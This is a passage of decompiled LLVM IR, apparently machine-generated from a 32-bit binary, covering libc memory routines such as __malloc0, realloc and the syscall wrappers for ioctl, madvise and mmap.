  uselistorder i32 %v7_b9dc, { 1, 5, 4, 7, 0, 3, 2, 6, 8, 9, 10 }
  uselistorder i32 %v4_b9dc, { 0, 2, 1 }
  uselistorder i32 %v0_bd00, { 10, 9, 8, 7, 5, 6, 3, 12, 4, 0, 11, 2, 1, 13 }
  uselistorder i32 %v1_b9d0, { 0, 2, 1 }
  uselistorder i32 %v3_b9c4, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_bbe4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b96c, { 1, 0 }
  uselistorder i32 %v6_b934, { 1, 2, 0 }
  uselistorder i32 %v1_b930, { 1, 2, 0 }
  uselistorder i32 %v0_bcd4, { 0, 7, 6, 5, 9, 8, 2, 1, 3, 10, 12, 11, 4, 13 }
  uselistorder i32 %v1_b92c, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 7, 8, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 46 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 20, 19, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 7, 6, 14, 8, 9, 10, 11, 13, 12, 15, 44, 16, 21, 17, 18, 19, 20, 22, 24, 23, 29, 27, 26, 25, 28, 34, 32, 31, 30, 33, 36, 35, 37, 38, 40, 39, 41, 42, 43 }
  uselistorder i32 ptrtoint (i32* @global_var_238f4.449 to i32), { 0, 4, 5, 1, 6, 7, 2, 8, 9, 3, 10, 11 }
  uselistorder i32 (i32*)* @__expand_heap, { 1, 0 }
  uselistorder i32* @global_var_238e4.465, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_238e4.465 to i32), { 3, 4, 5, 2, 6, 0, 7, 1, 8, 9, 10 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8), { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_19c46.463 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_238f4.449, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* @global_var_238f0.447, { 2, 3, 4, 0, 1, 5, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_238f0.447 to i32), { 18, 27, 28, 29, 11, 4, 30, 31, 5, 32, 19, 13, 33, 21, 34, 35, 22, 36, 2, 3, 37, 23, 38, 12, 39, 24, 40, 6, 41, 25, 42, 43, 0, 14, 7, 44, 15, 8, 45, 26, 46, 47, 1, 16, 20, 9, 48, 17, 10, 49 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_be50, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bd54, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_bd4c, { 1, 0 }
  uselistorder label %dec_label_pc_bbbc, { 1, 0 }
  uselistorder label %dec_label_pc_bb8c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_bb88, { 1, 0 }
  uselistorder label %dec_label_pc_bb70, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_bb2c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_bae4, { 1, 0 }
  uselistorder label %dec_label_pc_ba90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ba14, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b964.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b948.loopexit, { 2, 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_b914, { 2, 0, 1 }
}

define i32 @__malloc0(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_bfe4 = call i32 @malloc()
  %v2_bfe8 = icmp eq i32 %v0_bfe4, 0
  br i1 %v2_bfe8, label %dec_label_pc_c028, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %entry
  %v1_bff0 = add i32 %v0_bfe4, -4
  %v2_bff0 = inttoptr i32 %v1_bff0 to i32*
  %v3_bff0 = load i32, i32* %v2_bff0, align 4
  %v1_bff4 = urem i32 %v3_bff0, 2
  %v2_bff4 = icmp eq i32 %v1_bff4, 0
  br i1 %v2_bff4, label %dec_label_pc_c028, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bff0
  %v0_bffc = load i32, i32* @r4, align 4
  %v1_bffc = add i32 %v0_bffc, 3
  %v3_c000 = udiv i32 %v1_bffc, 4
  store i32 %v3_c000, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v1_bffc, 4
  br i1 %tmp, label %dec_label_pc_c028, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c00c

dec_label_pc_c00c:                                ; preds = %.thread, %dec_label_pc_c008
  %v0_c01c2 = phi i32 [ %v1_c01c, %.thread ], [ %v3_c000, %dec_label_pc_c008 ]
  %v2_c018 = phi i32 [ %v1_c020, %.thread ], [ 0, %dec_label_pc_c008 ]
  %v2_c00c = add i32 %v2_c018, %v0_bfe4
  %v3_c00c = inttoptr i32 %v2_c00c to i32*
  %v4_c00c = load i32, i32* %v3_c00c, align 4
  %v2_c010 = icmp eq i32 %v4_c00c, 0
  br i1 %v2_c010, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c00c
  store i32 0, i32* %v3_c00c, align 4
  %v0_c01c.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_c020.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c00c, %bb
  %v0_c020 = phi i32 [ %v2_c018, %dec_label_pc_c00c ], [ %v0_c020.pre, %bb ]
  %v0_c01c = phi i32 [ %v0_c01c2, %dec_label_pc_c00c ], [ %v0_c01c.pre, %bb ]
  %v1_c01c = add i32 %v0_c01c, -1
  store i32 %v1_c01c, i32* %r2.global-to-local, align 4
  %v7_c01c = icmp eq i32 %v0_c01c, 1
  %v1_c020 = add i32 %v0_c020, 4
  store i32 %v1_c020, i32* %r1.global-to-local, align 4
  br i1 %v7_c01c, label %dec_label_pc_c028.loopexit, label %dec_label_pc_c00c

dec_label_pc_c028.loopexit:                       ; preds = %.thread
  br label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %dec_label_pc_c028.loopexit, %dec_label_pc_bffc, %dec_label_pc_bff0, %entry
  ret i32 %v0_bfe4

; uselistorder directives
  uselistorder i32 %v1_c020, { 1, 0 }
  uselistorder i32 %v1_c01c, { 1, 0 }
  uselistorder i32 %v2_c018, { 1, 0 }
  uselistorder i32 %v3_c000, { 1, 0 }
  uselistorder i32 %v0_bfe4, { 2, 0, 1, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v6_c030 = load i32, i32* @r5, align 4
  %v9_c030 = load i32, i32* @r6, align 4
  %v21_c030 = load i32, i32* @sl, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_c034 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @r0, align 4
  br i1 %v2_c034, label %dec_label_pc_c1cc, label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %entry
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v1_c048 = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_c048, 2147479536
  br i1 %tmp, label %.thread, label %dec_label_pc_c05c

.thread:                                          ; preds = %dec_label_pc_c040
  %v5_c050 = add i32 %arg2, 23
  store i32 %v5_c050, i32* %r3.global-to-local, align 4
  %v5_c054 = and i32 %v5_c050, -16
  br label %dec_label_pc_c068

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c040
  %v2_c05c = icmp eq i32 %arg2, 0
  br i1 %v2_c05c, label %dec_label_pc_c068, label %dec_label_pc_c1f8

dec_label_pc_c068:                                ; preds = %dec_label_pc_c05c, %.thread
  %v0_c160 = phi i32 [ %v5_c054, %.thread ], [ 16, %dec_label_pc_c05c ]
  store i32 %v0_c160, i32* @r5, align 4
  %v1_c068 = add i32 %arg1, -8
  store i32 %v1_c068, i32* @r4, align 4
  %v1_c06c = add i32 %arg1, -4
  %v2_c06c = inttoptr i32 %v1_c06c to i32*
  %v3_c06c = load i32, i32* %v2_c06c, align 4
  %v1_c070 = urem i32 %v3_c06c, 2
  store i32 %v1_c070, i32* %r3.global-to-local, align 4
  %v2_c070 = icmp eq i32 %v1_c070, 0
  %v1_c074 = and i32 %v3_c06c, -2
  store i32 %v1_c074, i32* @r6, align 4
  br i1 %v2_c070, label %dec_label_pc_c07c, label %dec_label_pc_c0ec

dec_label_pc_c07c:                                ; preds = %dec_label_pc_c068
  %v2_c07c = inttoptr i32 %v1_c068 to i32*
  %v3_c07c = load i32, i32* %v2_c07c, align 4
  store i32 %v3_c07c, i32* @r7, align 4
  %v1_c080 = urem i32 %v3_c07c, 2
  %v2_c080 = icmp eq i32 %v1_c080, 0
  %v2_c084 = add i32 %v3_c07c, %v0_c160
  store i32 %v2_c084, i32* @r8, align 4
  br i1 %v2_c080, label %bb34, label %bb33

bb33:                                             ; preds = %dec_label_pc_c07c
  call void @llvm.trap()
  unreachable

bb34:                                             ; preds = %dec_label_pc_c07c
  %v3_c090 = icmp ult i32 %v2_c084, 4094
  br i1 %v3_c090, label %dec_label_pc_c160, label %dec_label_pc_c094

dec_label_pc_c094:                                ; preds = %dec_label_pc_c160.dec_label_pc_c094_crit_edge, %bb34
  %v1_c0a0 = phi i32 [ %v1_c0a0.pre, %dec_label_pc_c160.dec_label_pc_c094_crit_edge ], [ %v3_c07c, %bb34 ]
  %v0_c0a0 = phi i32 [ %v0_c0a0.pre, %dec_label_pc_c160.dec_label_pc_c094_crit_edge ], [ %v1_c074, %bb34 ]
  %v0_c094 = phi i32 [ %v0_c094.pre, %dec_label_pc_c160.dec_label_pc_c094_crit_edge ], [ %v2_c084, %bb34 ]
  %v1_c098 = add i32 %v0_c094, 4095
  store i32 %v1_c098, i32* %r3.global-to-local, align 4
  %v2_c0a0 = add i32 %v1_c0a0, %v0_c0a0
  store i32 %v2_c0a0, i32* %r6.global-to-local, align 4
  %v1_c0a4 = and i32 %v1_c098, -4096
  store i32 %v1_c0a4, i32* %r5.global-to-local, align 4
  %v9_c0a8 = icmp eq i32 %v2_c0a0, %v1_c0a4
  br i1 %v9_c0a8, label %bb37, label %dec_label_pc_c0b0

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c094
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v1_c0a4, i32* @r2, align 4
  %v1_c0b8 = load i32, i32* @r4, align 4
  %v2_c0b8 = sub i32 %v1_c0b8, %v1_c0a0
  store i32 %v2_c0b8, i32* @r0, align 4
  store i32 %v2_c0a0, i32* %r1.global-to-local, align 4
  %v4_c0c0 = call i32 @__mremap(i32 %v2_c0b8, i32 %v2_c0a0, i32 %v1_c0a4, i32 1)
  store i32 %v4_c0c0, i32* %r0.global-to-local, align 4
  %v3_c0c4 = icmp eq i32 %v4_c0c0, -1
  %v8_c0c4 = icmp eq i32 %v4_c0c0, -1
  br i1 %v8_c0c4, label %.thread3, label %bb35

bb35:                                             ; preds = %dec_label_pc_c0b0
  %v1_c0c8 = load i32, i32* @r7, align 4
  %v3_c0c8 = add i32 %v1_c0c8, %v4_c0c0
  store i32 %v3_c0c8, i32* %r3.global-to-local, align 4
  %v2_c0cc = load i32, i32* %r5.global-to-local, align 4
  %v3_c0cc = sub i32 %v2_c0cc, %v1_c0c8
  %v2_c0d0 = add i32 %v3_c0c8, 8
  store i32 %v2_c0d0, i32* @sb, align 4
  %v3_c0d4 = add i32 %v3_c0c8, 4
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i32*
  store i32 %v3_c0cc, i32* %v4_c0d4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_c0b0, %bb35
  br i1 %v3_c0c4, label %dec_label_pc_c0dc, label %dec_label_pc_c128

dec_label_pc_c0dc:                                ; preds = %.thread3
  %v0_c0dc = load i32, i32* %r6.global-to-local, align 4
  %v1_c0dc = load i32, i32* %r5.global-to-local, align 4
  %tmp41 = icmp ugt i32 %v0_c0dc, %v1_c0dc
  br i1 %tmp41, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_c0dc
  store i32 0, i32* @sl, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_c0dc, %dec_label_pc_c094, %bb36
  %v0_c0e4 = load i32, i32* @sl, align 4
  store i32 %v0_c0e4, i32* @sb, align 4
  br label %dec_label_pc_c128

dec_label_pc_c0ec:                                ; preds = %dec_label_pc_c068
  %v2_c0ec = add i32 %v1_c074, %v1_c068
  %v3_c0ec = inttoptr i32 %v2_c0ec to i32*
  %v4_c0ec = load i32, i32* %v3_c0ec, align 4
  store i32 %v4_c0ec, i32* %r3.global-to-local, align 4
  %v9_c0f0 = icmp eq i32 %v3_c06c, %v4_c0ec
  br i1 %v9_c0f0, label %.thread4, label %bb38

bb38:                                             ; preds = %dec_label_pc_c0ec
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_c0ec
  %v3_c0fc = icmp ult i32 %v1_c074, %v0_c160
  br i1 %v3_c0fc, label %dec_label_pc_c188, label %.thread9

.thread9:                                         ; preds = %.thread4
  %v2_c100 = or i32 %v3_c06c, 1
  store i32 %v2_c100, i32* %r3.global-to-local, align 4
  store i32 %v2_c0ec, i32* @r7, align 4
  store i32 %v2_c100, i32* %v3_c0ec, align 4
  %v1_c10c = load i32, i32* %r3.global-to-local, align 4
  %v2_c10c = load i32, i32* @r4, align 4
  %v3_c10c = add i32 %v2_c10c, 4
  %v4_c10c = inttoptr i32 %v3_c10c to i32*
  store i32 %v1_c10c, i32* %v4_c10c, align 4
  br label %dec_label_pc_c114

dec_label_pc_c114:                                ; preds = %dec_label_pc_c1d4, %.thread9
  %v0_c114 = load i32, i32* %r3.global-to-local, align 4
  %v1_c114 = and i32 %v0_c114, -2
  store i32 %v1_c114, i32* %r1.global-to-local, align 4
  %v1_c118 = add i32 %v1_c114, -16
  %v1_c11c = load i32, i32* @r5, align 4
  %tmp42 = icmp ugt i32 %v1_c118, %v1_c11c
  br i1 %tmp42, label %dec_label_pc_c134, label %dec_label_pc_c124

dec_label_pc_c124:                                ; preds = %dec_label_pc_c114, %dec_label_pc_c134
  %v0_c124 = load i32, i32* @r4, align 4
  %v1_c124 = add i32 %v0_c124, 8
  store i32 %v1_c124, i32* @sb, align 4
  br label %dec_label_pc_c128

dec_label_pc_c128:                                ; preds = %.thread3, %dec_label_pc_c1a4, %dec_label_pc_c1f8, %dec_label_pc_c1b4, %dec_label_pc_c170, %bb37, %dec_label_pc_c124
  %v0_c128 = load i32, i32* @sb, align 4
  store i32 %v0_c128, i32* %r0.global-to-local, align 4
  store i32 %v6_c030, i32* %r5.global-to-local, align 4
  store i32 %v9_c030, i32* %r6.global-to-local, align 4
  ret i32 %v0_c128

dec_label_pc_c134:                                ; preds = %dec_label_pc_c114
  %v2_c134 = sub i32 %v1_c114, %v1_c11c
  %v1_c138 = or i32 %v2_c134, 1
  store i32 %v1_c138, i32* %r3.global-to-local, align 4
  %v0_c13c = load i32, i32* @r4, align 4
  %v2_c13c = add i32 %v0_c13c, %v1_c11c
  store i32 %v2_c13c, i32* %r0.global-to-local, align 4
  %v1_c140 = or i32 %v1_c11c, 1
  store i32 %v1_c140, i32* @r2, align 4
  %v2_c144 = add i32 %v2_c13c, 4
  %v3_c144 = inttoptr i32 %v2_c144 to i32*
  store i32 %v1_c138, i32* %v3_c144, align 4
  %v0_c148 = load i32, i32* @r2, align 4
  %v1_c148 = load i32, i32* @r4, align 4
  %v2_c148 = load i32, i32* @r5, align 4
  %v3_c148 = add i32 %v2_c148, %v1_c148
  %v4_c148 = inttoptr i32 %v3_c148 to i32*
  store i32 %v0_c148, i32* %v4_c148, align 4
  %v0_c14c = load i32, i32* @r2, align 4
  %v1_c14c = load i32, i32* @r4, align 4
  %v2_c14c = add i32 %v1_c14c, 4
  %v3_c14c = inttoptr i32 %v2_c14c to i32*
  store i32 %v0_c14c, i32* %v3_c14c, align 4
  %v0_c150 = load i32, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v2_c150 = load i32, i32* %r1.global-to-local, align 4
  %v3_c150 = add i32 %v2_c150, %v1_c150
  %v4_c150 = inttoptr i32 %v3_c150 to i32*
  store i32 %v0_c150, i32* %v4_c150, align 4
  %v0_c154 = load i32, i32* %r0.global-to-local, align 4
  %v1_c154 = add i32 %v0_c154, 8
  store i32 %v1_c154, i32* %r0.global-to-local, align 4
  %v1_c158 = call i32 @free(i32 %v1_c154)
  store i32 %v1_c158, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c124

dec_label_pc_c160:                                ; preds = %bb34
  store i32 %v0_c160, i32* @r0, align 4
  %v0_c164 = call i32 @malloc()
  store i32 %v0_c164, i32* %r0.global-to-local, align 4
  store i32 %v0_c164, i32* @sb, align 4
  %v2_c168 = icmp eq i32 %v0_c164, 0
  br i1 %v2_c168, label %dec_label_pc_c160.dec_label_pc_c094_crit_edge, label %dec_label_pc_c170

dec_label_pc_c160.dec_label_pc_c094_crit_edge:    ; preds = %dec_label_pc_c160
  %v0_c094.pre = load i32, i32* @r8, align 4
  %v0_c0a0.pre = load i32, i32* @r6, align 4
  %v1_c0a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c094

dec_label_pc_c170:                                ; preds = %dec_label_pc_c160
  %v0_c170 = load i32, i32* @r5, align 4
  %v1_c170 = add i32 %v0_c170, -8
  %v0_c174 = load i32, i32* @sl, align 4
  store i32 %v0_c174, i32* %r1.global-to-local, align 4
  %v3_c178 = inttoptr i32 %v0_c164 to i16*
  %v4_c178 = call i32 @memcpy(i16* %v3_c178, i32 %v0_c174, i32 %v1_c170)
  %v0_c17c = load i32, i32* @sl, align 4
  store i32 %v0_c17c, i32* %r0.global-to-local, align 4
  %v1_c180 = call i32 @free(i32 %v0_c17c)
  store i32 %v1_c180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c128

dec_label_pc_c188:                                ; preds = %.thread4
  store i32 %v2_c0ec, i32* @r7, align 4
  store i32 %v2_c0ec, i32* %r0.global-to-local, align 4
  %v1_c18c = call i32 @alloc_fwd(i32 %v2_c0ec)
  store i32 %v1_c18c, i32* %r0.global-to-local, align 4
  %v2_c190 = icmp eq i32 %v1_c18c, 0
  br i1 %v2_c190, label %.thread12, label %dec_label_pc_c1d4

.thread12:                                        ; preds = %dec_label_pc_c188
  %v1_c194 = load i32, i32* @r6, align 4
  %v2_c194 = or i32 %v1_c194, 1
  store i32 %v2_c194, i32* %r3.global-to-local, align 4
  %v2_c198 = load i32, i32* @r4, align 4
  %v4_c198 = add i32 %v2_c198, %v1_c194
  %v5_c198 = inttoptr i32 %v4_c198 to i32*
  store i32 %v2_c194, i32* %v5_c198, align 4
  %v1_c19c = load i32, i32* %r3.global-to-local, align 4
  %v2_c19c = load i32, i32* @r4, align 4
  %v3_c19c = add i32 %v2_c19c, 4
  %v4_c19c = inttoptr i32 %v3_c19c to i32*
  store i32 %v1_c19c, i32* %v4_c19c, align 4
  br label %dec_label_pc_c1a4

dec_label_pc_c1a4:                                ; preds = %dec_label_pc_c1d4, %.thread12
  %v0_c1a4 = load i32, i32* @r5, align 4
  %v1_c1a4 = add i32 %v0_c1a4, -8
  store i32 %v1_c1a4, i32* @r0, align 4
  %v0_c1a8 = call i32 @malloc()
  store i32 %v0_c1a8, i32* %r0.global-to-local, align 4
  store i32 %v0_c1a8, i32* @sb, align 4
  %v2_c1ac = icmp eq i32 %v0_c1a8, 0
  br i1 %v2_c1ac, label %dec_label_pc_c128, label %dec_label_pc_c1b4

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_c1a4
  %v0_c1b4 = load i32, i32* @sl, align 4
  store i32 %v0_c1b4, i32* %r1.global-to-local, align 4
  %v0_c1b8 = load i32, i32* @r6, align 4
  %v1_c1b8 = add i32 %v0_c1b8, -8
  %v3_c1bc = inttoptr i32 %v0_c1a8 to i16*
  %v4_c1bc = call i32 @memcpy(i16* %v3_c1bc, i32 %v0_c1b4, i32 %v1_c1b8)
  %v0_c1c0 = load i32, i32* @r4, align 4
  %v1_c1c0 = add i32 %v0_c1c0, 8
  store i32 %v1_c1c0, i32* %r0.global-to-local, align 4
  %v1_c1c4 = call i32 @free(i32 %v1_c1c0)
  store i32 %v1_c1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c128

dec_label_pc_c1cc:                                ; preds = %entry
  store i32 %v21_c030, i32* @sl, align 4
  %v0_c1d0 = call i32 @malloc()
  store i32 %v0_c1d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %dec_label_pc_c188, %dec_label_pc_c1cc
  %v0_c1d4 = load i32, i32* @r7, align 4
  %v1_c1d4 = add i32 %v0_c1d4, 4
  %v2_c1d4 = inttoptr i32 %v1_c1d4 to i32*
  %v3_c1d4 = load i32, i32* %v2_c1d4, align 4
  %v1_c1d8 = and i32 %v3_c1d4, -2
  %v1_c1dc = load i32, i32* @r6, align 4
  %v2_c1dc = add i32 %v1_c1dc, %v1_c1d8
  %v1_c1e0 = load i32, i32* @r5, align 4
  %v3_c1e0 = icmp ult i32 %v2_c1dc, %v1_c1e0
  %v1_c1e4 = or i32 %v2_c1dc, 1
  store i32 %v1_c1e4, i32* %r3.global-to-local, align 4
  %v3_c1e8 = add i32 %v1_c1d8, %v0_c1d4
  %v4_c1e8 = inttoptr i32 %v3_c1e8 to i32*
  store i32 %v1_c1e4, i32* %v4_c1e8, align 4
  %v0_c1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_c1ec = load i32, i32* @r4, align 4
  %v2_c1ec = add i32 %v1_c1ec, 4
  %v3_c1ec = inttoptr i32 %v2_c1ec to i32*
  store i32 %v0_c1ec, i32* %v3_c1ec, align 4
  br i1 %v3_c1e0, label %dec_label_pc_c1a4, label %dec_label_pc_c114

dec_label_pc_c1f8:                                ; preds = %dec_label_pc_c05c
  %v0_c1f8 = call i32 @__errno_location()
  store i32 %v0_c1f8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_c204 = inttoptr i32 %v0_c1f8 to i32*
  store i32 12, i32* %v2_c204, align 4
  br label %dec_label_pc_c128

; uselistorder directives
  uselistorder i32 %v1_c11c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c0ec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_c0c8, { 1, 0 }
  uselistorder i32 %v4_c0c0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c0a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c084, { 1, 0, 2 }
  uselistorder i32 %v3_c07c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c074, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c070, { 1, 0 }
  uselistorder i32 %v3_c06c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c160, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 8, 9, 10, 15, 11, 12, 13, 14, 16, 0 }
  uselistorder i32 (i32)* @alloc_fwd, { 1, 0 }
  uselistorder i32 %arg2, { 3, 1, 0, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_c1d4, { 1, 0 }
  uselistorder label %dec_label_pc_c128, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder label %dec_label_pc_c124, { 1, 0 }
  uselistorder label %bb37, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  %v0_c230 = call i32 @__syscall_ret()
  ret i32 %v0_c230
}

define i32 @__madvise(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_c250 = call i32 @__syscall_ret()
  ret i32 %v0_c250
}

define i32 @_dummy.1() local_unnamed_addr {
entry:
  %v1_c25c = load i32, i32* @r0, align 4
  ret i32 %v1_c25c
}

define i32 @__mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c260 = load i32, i32* @r4, align 4
  %v2_c278 = urem i32 %arg6, 4096
  %v2_c27c = and i32 %arg7, -4096
  %v2_c280 = or i32 %v2_c27c, %v2_c278
  %v4_c280 = icmp eq i32 %v2_c280, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %fp.global-to-local, align 4
  %v0_c290 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_c290, i32* %sl.global-to-local, align 4
  br i1 %v4_c280, label %dec_label_pc_c2a8, label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %entry
  %v0_c298 = call i32 @__errno_location()
  br label %dec_label_pc_c2bc

dec_label_pc_c2a8:                                ; preds = %entry
  %tmp = icmp ult i32 %arg2, 2147483647
  br i1 %tmp, label %dec_label_pc_c2c4, label %dec_label_pc_c2b0

dec_label_pc_c2b0:                                ; preds = %dec_label_pc_c2a8
  %v0_c2b0 = call i32 @__errno_location()
  br label %dec_label_pc_c2bc

dec_label_pc_c2bc:                                ; preds = %dec_label_pc_c298, %dec_label_pc_c2b0
  %storemerge1 = phi i32 [ %v0_c298, %dec_label_pc_c298 ], [ %v0_c2b0, %dec_label_pc_c2b0 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_c298 ], [ 12, %dec_label_pc_c2b0 ]
  store i32 -1, i32* @r2, align 4
  store i32 %storemerge, i32* @r3, align 4
  %v2_c2bc = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_c2bc, align 4
  %v0_c304.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_c304

dec_label_pc_c2c4:                                ; preds = %dec_label_pc_c2a8
  %v1_c2c4 = and i32 %v0_c290, 16
  %v2_c2c4 = icmp eq i32 %v1_c2c4, 0
  br i1 %v2_c2c4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c2c4
  store i32 49756, i32* %r3.global-to-local, align 4
  store i32 49876, i32* @lr, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c2c4, %bb
  %v2_c2d0 = xor i1 %v2_c2c4, true
  call void @__pseudo_cond_branch(i1 %v2_c2d0, i32 ptrtoint (i32* @global_var_c25c.473 to i32))
  %v0_c2d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c2d8, i32* @r1, align 4
  %v0_c2e4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c2e4, i32* @r0, align 4
  %v0_c2e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c2e8, i32* @r2, align 4
  %v0_c2ec = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_c2ec, i32* @r3, align 4
  %v3_c2f0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_c2f0, i32* @r4, align 4
  %v0_c2fc = call i32 @__syscall_ret()
  br label %dec_label_pc_c304

dec_label_pc_c304:                                ; preds = %dec_label_pc_c2bc, %.thread
